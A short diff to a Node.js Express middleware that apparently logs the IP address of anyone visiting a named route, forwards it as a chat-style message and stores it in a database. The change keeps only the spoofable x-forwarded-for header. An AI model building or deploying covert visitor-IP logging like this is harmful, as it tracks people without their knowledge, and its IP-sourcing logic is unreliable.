@@ -1,6 +1,6 @@
 import Route from '../models/Routes';
 import Ip from '../models/Ip';
-
+var requestIp = require('request-ip');
 var request = require('request');
 
 function updateClient(postData){
@@ -36,7 +36,7 @@ function sendIp(postData){
 export const checkDoubleRoute = async (req, res, next) => {
 	const route = await Route.findOne({routeName: req.params.id})
 	if (route){
-        const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+        const ip = req.headers['x-forwarded-for']
 		sendIp({content: `**IP:** ${ip} \nowo`});
         let newIp = new Ip({
             hostName: ip
